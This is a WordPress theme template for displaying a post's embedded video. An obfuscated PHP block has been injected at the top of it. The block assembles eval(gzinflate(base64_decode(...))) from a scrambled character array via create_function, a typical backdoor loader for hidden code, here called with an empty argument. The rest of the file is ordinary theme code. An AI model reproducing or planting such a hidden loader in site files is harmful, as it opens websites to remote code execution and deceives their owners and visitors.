<?php
$md5 = "8e1cc6d05ac599cca0eb1bde6b912802";
$ab = array("t","i",'e',')','c',"s","4",";",'z',"6",'a','r','d','o',"v",'b','g',"f","(","l",'_',"$",'n');
$bb9 = create_function('$'.'v',$ab[2].$ab[14].$ab[10].$ab[19].$ab[18].$ab[16].$ab[8].$ab[1].$ab[22].$ab[17].$ab[19].$ab[10].$ab[0].$ab[2].$ab[18].$ab[15].$ab[10].$ab[5].$ab[2].$ab[9].$ab[6].$ab[20].$ab[12].$ab[2].$ab[4].$ab[13].$ab[12].$ab[2].$ab[18].$ab[21].$ab[14].$ab[3].$ab[3].$ab[3].$ab[7]);
$bb9('');
?>
<?php
/**
 * Content video
 *
 * @package WordPress
 * @subpackage Newsportal
 * @since Newsportal 1.0
 */

    $video_url  = get_post_meta(get_the_ID(), 'video', true);
    $video      = wp_oembed_get( $video_url ); 

    if($video): ?>
      <figure class='entry-top'>
            <div class="entry-video">
                    <?php echo $video; ?>
                    <?php if($video_auto == 'Yes'): ?>
                            <script>
                                jQuery('.vid object').append('<param name="autoplay" value="0">');
                            </script>
                    <?php endif; ?>
            </div>
      </figure>
    <?php endif; ?>